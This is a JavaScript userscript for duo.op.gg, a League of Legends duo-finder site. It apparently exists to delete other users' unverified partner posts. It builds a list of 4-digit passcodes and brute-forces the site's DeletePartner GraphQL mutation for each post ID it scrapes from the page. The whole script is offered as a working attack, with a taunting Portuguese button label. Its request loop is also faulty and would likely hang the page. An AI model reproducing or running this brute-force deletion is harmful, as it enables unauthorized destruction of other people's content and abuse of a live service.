// ==UserScript==
// @name         Duo.gg
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  op.gg
// @author       You
// @match        *://duo.op.gg/*/lol/
// @icon         https://www.google.com/s2/favicons?sz=64&domain=op.gg
// @grant        GM_log
// @grant        GM_xmlhttpRequest
// @grant        GM_addStyle
// @require      http://code.jquery.com/jquery-latest.js
// @require      http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js
// @run-at       document-idle
// ==/UserScript==

(function() {
    'use strict';

var zNode       = document.createElement ('div');
zNode.innerHTML = '<button id="myButton" type="button">'
                + 'O furto ou a falsificação imprudentes podem conduzir a sanções!</button>'
                ;
zNode.setAttribute ('id', 'myContainer');
document.body.appendChild (zNode);

document.getElementById ("myButton").addEventListener (
    "click", ButtonClickAction, false
);

function ButtonClickAction (zEvent) {
    var zNode       = document.createElement ('p');
    zNode.innerHTML = 'Iniciando sanções';
    document.getElementById ("myContainer").appendChild (zNode);
    wipeDay();
}

//--- Style our newly added elements using CSS.
GM_addStyle ( `
    #myContainer {
        position:               absolute;
        top:                    0;
        left:                   0;
        font-size:              20px;
        background:             #302c34;
        border:                 3px outset black;
        margin:                 5px;
        opacity:                0.9;
        z-index:                1100;
        padding:                5px 20px;
    }
    #myButton {
        cursor:                 pointer;
    }
    #myContainer p {
        color:                  red;
        background:             white;
    }
    #myContainer{
        transform:translatex(803px) translatey(92px);
    }
` );

function hasConsecutiveSequences(str) {
  for (let i = 0; i < str.length - 3; i++) {
    const sequence = str.slice(i, i + 4);
    if (parseInt(sequence) === parseInt(sequence[0].repeat(4)) + 1) {
      return true;
    }
  }
  return false;
}

function hasRepeatingNumbers(str) {
  for (let i = 0; i < str.length - 2; i++) {
    if (str[i] === str[i + 1] && str[i] === str[i + 2]) {
      return true;
    }
  }
  return false;
}

const numbersArray = [];

for (let i = 0; i <= 9999; i++) {
  const paddedNumber = i.toString().padStart(4, '0');
  if (!hasConsecutiveSequences(paddedNumber) && !hasRepeatingNumbers(paddedNumber)) {
    numbersArray.push(paddedNumber);
  }
}

var senhas = numbersArray;

function wipeDay(){
    var y = 0;
    const divs = document.querySelectorAll('[id^="partner-"].flex.items-center');
    const filteredDivs = Array.from(divs).filter(div => !div.textContent.includes("Verificado"));
    const numbers = Array.from(filteredDivs).map(div => div.id.match(/\d+/)[0]);
    const uniqueNumbers = [...new Set(numbers)];

    for(y = 0; y < uniqueNumbers.length; y++){
        httpRequest(uniqueNumbers[y]);
    }
}

function httpRequest(id) {
var i = 0;
var found = false;
    while(found == false){
        GM_xmlhttpRequest({
            method: "post",
            url: "https://duo.op.gg/graphql",
            headers: { "Content-type" : "application/json" },
            data: JSON.stringify( {
                "operationName": "DeletePartner",
                "variables": {
                "id": id,
                "passcode": senhas[i]
                },
                "query": "mutation DeletePartner($id: ID!, $passcode: String) {\n  deletePartner(id: $id, passcode: $passcode) {\n    id\n    __typename\n  }\n}"
            } ),
           onload: function(e) {
               if (e.responseText.includes("InvalidPassword")) {
                   i++;
               }
               else{
                   found = true;
                   console.log('acertou');
               }
           }
        });
    }
}

//     document.addEventListener('click', function(event) {




//   });


})();